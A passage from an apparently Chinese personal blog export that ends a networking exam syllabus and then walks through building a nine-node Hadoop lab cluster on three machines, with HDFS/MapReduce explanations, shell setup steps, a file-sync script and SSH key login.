<p>ALOHA 协议;CSMA 协议;CSMA&#x2F;CD 协议;CSMA&#x2F;CA 协议。</p>
<p> 3.轮询访问</p>
<p>令牌传递协议</p>
<p> (六)局域网</p>
<p>1.局域网的基本概念与体系结构</p>
<p>2.以太网与 IEEE 802.3</p>
<p>3.IEEE 802.11</p>
<p>4.VLAN 基本概念与基本原理</p>
<p>(七)广域网</p>
<p>1.广域网的基本概念</p>
<p>2.PPP 协议</p>
<p>(八)数据链路层设备</p>
<p> 1.以太网交换机及其工作原理。</p>
<h3 id="四、网络层"><a href="#四、网络层" class="headerlink" title="四、网络层"></a>四、网络层</h3><p>(一)网络层的功能</p>
<p>1.异构网络互联</p>
<p>2.路由与转发</p>
<p>3.SDN 基本概念</p>
<p>4.拥塞控制</p>
<p>(二)路由算法</p>
<p>1.静态路由与动态路由</p>
<p>2.距离-向量路由算法</p>
<p>3.链路状态路由算法</p>
<p>4.层次路由</p>
<p> (三)IPv4</p>
<p>1.IPv4 分组</p>
<p>2.IPv4 地址与 NAT</p>
<p>3.子网划分与子网掩码、CIDR</p>
<p>4.ARP 协议、DHCP 协议与 ICMP 协议</p>
<p> (四)IPv6</p>
<p>1.IPv6 的主要特点</p>
<p>2.IPv6 地址</p>
<p> (五)路由协议</p>
<p>1.自治系统</p>
<p>2.域内路由与域间路由</p>
<p>3.RIP 路由协议</p>
<p>4.OSPF 路由协议</p>
<p>5.BGP 路由协议</p>
<p> (六)IP 组播</p>
<p>1.组播的概念</p>
<p>2.IP 组播地址</p>
<p> (七)移动 IP</p>
<p>1.移动 IP 的概念</p>
<p>2.移动 IP 的通信过程</p>
<p>(八)网络层设备</p>
<p>1.路由器的组成和功能</p>
<p>2.路由表与路由转发</p>
<h3 id="五、传输层"><a href="#五、传输层" class="headerlink" title="五、传输层"></a>五、传输层</h3><p>(一)传输层提供的服务</p>
<p> 1.传输层的功能</p>
<p>2.传输层寻址与端口</p>
<p>3.无连接服务与面向连接服务</p>
<p>(二)UDP 协议</p>
<p>1.UDP 数据报</p>
<p>2.UDP 校验</p>
<p>(三)TCP 协议</p>
<p>1.TCP 段</p>
<p>2.TCP 连接管理</p>
<p>3.TCP 可靠传输</p>
<p>4.TCP 流量控制与拥塞控制</p>
<h3 id="六、应用层"><a href="#六、应用层" class="headerlink" title="六、应用层"></a>六、应用层</h3><p>(一)网络应用模型  爱你哟</p>
<p>1.客户&#x2F;服务器模型</p>
<p>2.P2P 模型</p>
<p>(二)DNS 系统</p>
<p>1.层次域名空间</p>
<p>2.域名服务器</p>
<p>3.域名解析过程</p>
<p>(三)FTP</p>
<p>1.FTP 协议的工作原理</p>
<p>2.控制连接与数据连接</p>
<p>(四)电子邮件</p>
<p>1.电子邮件系统的组成结构</p>
<p>2.电子邮件格式与 MIME</p>
<p>3.SMTP 协议与 POP3 协议</p>
<p>(五)WWW</p>
<p>1.WWW 的概念与组成结构</p>
<p>2.HTTP 协议</p>
<blockquote>
<p>爱你哟</p>
</blockquote>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>408</tag>
        <tag>考纲</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-4 多物理机环境搭建</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-4%20%E5%A4%9A%E7%89%A9%E7%90%86%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Lab-4-多物理机环境搭建和词频统计-九个节点，三台物理机"><a href="#Lab-4-多物理机环境搭建和词频统计-九个节点，三台物理机" class="headerlink" title="Lab-4 多物理机环境搭建和词频统计(九个节点，三台物理机)"></a>Lab-4 多物理机环境搭建和词频统计(九个节点，三台物理机)</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="Hadoop是什么"><a href="#Hadoop是什么" class="headerlink" title="Hadoop是什么"></a>Hadoop是什么</h3><p>Hadoop是Apache软件基金会所开发的并行计算框架与分布式文件系统。最核心的模块包括Hadoop Common、HDFS与MapReduce。</p>
<h3 id="HDFS架构"><a href="#HDFS架构" class="headerlink" title="HDFS架构"></a>HDFS架构</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115381.png" alt="image-20210628203053925"></p>
<h3 id="HDFS文件写入"><a href="#HDFS文件写入" class="headerlink" title="HDFS文件写入"></a>HDFS文件写入</h3><p>Client向NameNode发起文件写入的请求。</p>
<ol>
<li>NameNode根据文件大小和文件块配置情况，返回给Client它所管理部分DataNode的信息。</li>
<li>Client将文件划分为多个block块，并根据DataNode的地址信息，按顺序写入到每一个DataNode块中。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220112888.png" alt="58qho28cfd"></p>
<p>例如：有一个文件FileA，100M大小。Client将FileA写入到HDFS上。</p>
<ol>
<li>HDFS按默认配置。</li>
<li>HDFS分布在三个机架上Rack1，Rack2，Rack3。</li>
</ol>
<p>文件写入过程如下：</p>
<ol>
<li>Client将FileA按64M分块。分成两块，block1和Block2;</li>
<li>Client向NameNode发送写数据请求，如图蓝色虚线①——&gt;。</li>
<li>NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②———&gt;。<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>原理：<ol>
<li>NameNode具有RackAware机架感知功能，这个可以配置。</li>
<li>若Client为DataNode节点，那存储block时，规则为：副本1，同Client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。</li>
<li>若Client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。</li>
</ol>
</li>
</ol>
</li>
<li>Client向DataNode发送block1；发送过程是以流式写入。流式写入过程如下：<ol>
<li>将64M的block1按64k的package划分;</li>
<li>然后将第一个package发送给host2;</li>
<li>host2接收完后，将第一个package发送给host1，同时Client向host2发送第二个package；</li>
<li>host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。</li>
<li>以此类推，如图红线实线所示，直到将block1发送完毕。</li>
<li>host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红颜色实线所示。</li>
<li>Client收到host2发来的消息后，向NameNode发送消息，说我写完了。这样就真完成了。如图黄色粗实线</li>
<li>发送完block1后，再向host7、host8、host4发送block2，如图蓝色实线所示。</li>
<li>发送完block2后，host7、host8、host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。</li>
<li>Client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。</li>
</ol>
</li>
<li>分析：通过写过程，我们可以了解到<ol>
<li>写1T文件，我们需要3T的存储，3T的网络流量带宽。</li>
<li>在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。</li>
<li>挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。</li>
</ol>
</li>
</ol>
<h3 id="HDFS文件读取"><a href="#HDFS文件读取" class="headerlink" title="HDFS文件读取"></a>HDFS文件读取</h3><p>当文件读取：</p>
<ol>
<li>Client向NameNode发起文件读取的请求。</li>
<li>NameNode返回文件存储的block块信息、及其block块所在DataNode的信息。</li>
<li>Client读取文件信息。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115382.png" alt="ttt078ctfp"></p>
<p>如图所示，Client要从DataNode上，读取FileA。而FileA由block1和block2组成。读操作流程如下：</p>
<ol>
<li>Client向NameNode发送读请求。</li>
<li>NameNode查看Metadata信息，返回FileA的block的位置。<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取。</li>
</ol>
<p>上面例子中，Client位于机架外，那么如果Client位于机架内某个DataNode上，例如,Client是host6。那么读取的时候，遵循的规律是：<strong>优选读取本机架上的数据。</strong></p>
<h3 id="MapReduce核心思想"><a href="#MapReduce核心思想" class="headerlink" title="MapReduce核心思想"></a>MapReduce核心思想</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115383.png" alt="image-20210701084254232"></p>
<ul>
<li><p>分布式的运算程序往往需要分成至少 2 个阶段。</p>
</li>
<li><p>第一个阶段的 MapTask 并发实例，完全并行运行，互不相干。</p>
</li>
<li><p>第二个阶段的 ReduceTask 并发实例互不相干，但是他们的数据依赖于上一个阶段</p>
</li>
</ul>
<p>的所有 MapTask 并发实例的输出。</p>
<ul>
<li>MapReduce 编程模型只能包含一个 Map 阶段和一个 Reduce 阶段，如果用户的业</li>
</ul>
<p>务逻辑非常复杂，那就只能多个 MapReduce 程序，串行运行。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="准备三台主机MacBook-pro，Windows-10-1，Windows-10-2"><a href="#准备三台主机MacBook-pro，Windows-10-1，Windows-10-2" class="headerlink" title="准备三台主机MacBook pro，Windows 10-1，Windows 10-2"></a>准备三台主机MacBook pro，Windows 10-1，Windows 10-2</h3><p>在mbp上用Parallels Desktop安装centos 7.5，主机名为hadoop102</p>
<p>在win10-1用VMware Workstation安装centos 7.5，主机名为hadoop103</p>
<p>在win10-2用VMware Workstation安装centos 7.5，主机名为hadoop104</p>
<p>下面为mac上的hadoop102的为例，win也用同样方法配置一台模板机：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改主机名</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop102 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop102 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop102 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop102 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop102 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="克隆虚拟机"><a href="#克隆虚拟机" class="headerlink" title="克隆虚拟机"></a>克隆虚拟机</h3><p>在mbp上利用模版虚拟机克隆三台虚拟机hadoop102（192.168.58.31） hadoop109(192.168.58.107) hadoop110(192.168.58.155) ，克隆的时候先关闭虚拟机</p>
<p>在win10-1上利用模版虚拟机克隆三台虚拟机hadoop103（192.168.58.68） hadoop107(192.168.58.43) hadoop108(192.168.58.121) ，克隆的时候先关闭虚拟机</p>
<p>在win10-2上利用模版虚拟机克隆三台虚拟机hadoop104（192.168.58.190） hadoop105(192.168.58.189) hadoop106(192.168.58.34) ，克隆的时候先关闭虚拟机</p>
<h4 id="修改克隆机的主机名和hosts，已hadoop102为例"><a href="#修改克隆机的主机名和hosts，已hadoop102为例" class="headerlink" title="修改克隆机的主机名和hosts，已hadoop102为例"></a>修改克隆机的主机名和hosts，已hadoop102为例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>其他虚拟机以相同方式去修改</p>
<h4 id="修改主机Mac的hosts"><a href="#修改主机Mac的hosts" class="headerlink" title="修改主机Mac的hosts"></a>修改主机Mac的hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装JDK"><a href="#在hadoop102安装JDK" class="headerlink" title="在hadoop102安装JDK"></a>在hadoop102安装JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">将mac中下载好的jdk导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">查看是否导入成功</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装Hadoop"><a href="#在hadoop102安装Hadoop" class="headerlink" title="在hadoop102安装Hadoop"></a>在hadoop102安装Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">将mac中下载好的hadoop导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br></pre></td></tr></table></figure>

<h3 id="Hadoop目录结构"><a href="#Hadoop目录结构" class="headerlink" title="Hadoop目录结构"></a>Hadoop目录结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin 目录:存放对 Hadoop 相关服务(hdfs，yarn，mapred)进行操作的脚本 </li>
<li>etc 目录:Hadoop 的配置文件目录，存放 Hadoop 的配置文件</li>
<li>lib 目录:存放 Hadoop 的本地库(对数据进行压缩解压缩功能)</li>
<li>sbin 目录:存放启动或停止 Hadoop 相关服务的脚本</li>
<li>share 目录:存放 Hadoop 的依赖 jar 包、文档、和官方案例</li>
</ul>
<h3 id="编写集群分发脚本"><a href="#编写集群分发脚本" class="headerlink" title="编写集群分发脚本"></a>编写集群分发脚本</h3><h4 id="rsync和scp的区别"><a href="#rsync和scp的区别" class="headerlink" title="rsync和scp的区别"></a>rsync和scp的区别</h4><p>rsync 主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。</p>
<p>rsync 和 scp 区别:用 rsync 做文件的复制要比 scp 的速度快，rsync 只对差异文件做更</p>
<p>新。scp 是把所有文件都复制过去。</p>
<h4 id="编写xsync集群分发脚本"><a href="#编写xsync集群分发脚本" class="headerlink" title="编写xsync集群分发脚本"></a>编写xsync集群分发脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>添加一下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 hadoop105 hadoop106 hadoop107 hadoop108 hadoop109 hadoop110</span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="分发环境变量"><a href="#分发环境变量" class="headerlink" title="分发环境变量"></a>分发环境变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">让环境变量生效(在有机器上都需要执行下面的操作，下面也hadoop103为例)</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="SSH无密码登陆配置"><a href="#SSH无密码登陆配置" class="headerlink" title="SSH无密码登陆配置"></a>SSH无密码登陆配置</h3><h4 id="免密码登陆原理"><a href="#免密码登陆原理" class="headerlink" title="免密码登陆原理"></a>免密码登陆原理</h4><p><strong>1.通常的ssh密码登陆过程</strong></p>
<ul>
<li>用户向所要登陆的远程主机发送登陆请求</li>
<li>远程主机收到用户的登录请求，把自己的公钥发送给用户</li>
<li>用户使用这个公钥，将登陆密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登陆密码，如果密码正确，就同意用户登陆</li>
</ul>
<p>在linux中，如果第一次通过ssh登陆远程主机，会出现以下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (192.168.58.68)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

<p>这段话的意思是，无法确认host主机的真实性，公钥指纹和MD5可能会被中间人攻击替换，问你还想继续吗？</p>
<p>所谓的“公钥指纹”，是指公钥长度较长（这里采用RSA算法，长达1024位），很难比对，所以对其进行MD5计算，将他变成128位的指纹。上列中是93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.再进行比较，就容易多了。</p>
<p>假定经过风险衡量以后，用户决定接受这个远程主机的公钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>系统会出现一句提示，表示host主机已经得到认可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>然后，会要求输入密码。</p>
<p>如果密码正确，就可以登录了。</p>
<p>当远程主机的公钥被接受以后，它就会被保存在用户home目录的$HOME&#x2F;.ssh&#x2F;known_hosts文件之中。下次再连接这台远程主机，系统就会认出它的公钥已经保存在本地了，从而跳过警告部分，直接提示输入密码。</p>
<p>如果远程主机重新装过系统或因为别的原因，导致ssh指纹改变，需要把.ssh目录下的know_hosts文件中相应远程主机IP一致的指纹删除，再通过ssh登录一次回答yes，重新认证一次方可登录。注意.ssh是目录是以“.”开头的隐藏目录，需要#ls -a参数才能看到。而且这个目录的权限必须是700，并且用户的home目录也不能给其他用户写权限，否则ssh服务器会拒绝登录。如果发生不能登录的问题，可以查看服务器上的日志文件&#x2F;var&#x2F;log&#x2F;secure。</p>
<p><strong>2.公钥登陆（免密码登陆）</strong></p>
<p>A服务器想要无密码登陆B服务器的话，得把自己的公钥给B，B如果想让A无密码登陆就认可A的公钥，这样A的发送的指令不保密（因为公钥是公开的），但是B返回的结果只有A能解开</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115384.png" alt="image-20210628003617469"></p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">生成公钥和私钥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">按三下回车就会生成rsa文件</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将公钥拷贝到要免密登陆的目标机器上</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>还需要在 hadoop103 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop104 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
<li>还需要在 hadoop105 上采用 huang 账号配置一下无密登录到 hadoop102、hadoop103、 hadoop104、hadoop105、hadoop106、hadoop107、hadoop108、hadoop109、hadoop110 服务器上。</li>
